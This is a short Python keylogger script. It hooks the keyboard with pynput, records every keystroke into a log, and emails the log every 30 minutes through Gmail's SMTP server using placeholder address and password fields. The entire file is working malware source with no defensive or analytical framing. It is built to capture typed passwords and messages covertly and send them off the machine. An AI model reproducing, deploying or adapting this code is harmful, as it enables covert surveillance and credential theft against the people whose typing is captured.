import pynput.keyboard
import threading
import smtplib

log = ""

def callback_function(key):
    global log
    try:
        log += key.char  # Directly log the character like letters, numbers, symbols
    except AttributeError:
        if key == key.space:
            log += " "  # Log spaces
        else:
            log += " " + str(key) + " "  # Log special characters like Enter, Shift

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # gmails SMTP server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def send_log():
    global log
    send_email("enteryouremail@gmail.com", "enteryourpassword", log)
    log = ""
    # Trigger email again after 30 minutes time frame
    timer = threading.Timer(1800, send_log)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)
with keyboard_listener:
    send_log()
    keyboard_listener.join()
